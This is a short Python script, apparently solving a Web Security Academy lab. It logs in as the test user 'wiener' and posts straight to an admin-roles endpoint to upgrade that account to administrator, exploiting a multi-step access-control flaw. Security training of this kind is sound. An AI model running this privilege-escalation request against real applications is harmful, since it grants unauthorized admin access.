import requests, re 
from bs4 import BeautifulSoup

s = requests.Session()

site = 'acb01f931fc9bdb6c04b114800d00000.web-security-academy.net'

login_url = f'https://{site}/login'
admin_url = f'https://{site}/admin-roles'

login_data = {
    'username' : 'wiener',
    'password' : 'peter'
}

resp = s.post(login_url, data=login_data)
soup = BeautifulSoup(resp.text, 'html.parser')
print(soup)

upgrade_data = {
    'username' : 'wiener',
    'action' : 'upgrade',
    'confirmed' : 'true'
}

resp = s.post(admin_url,data=upgrade_data)
soup = BeautifulSoup(resp.text, 'html.parser')
print(soup)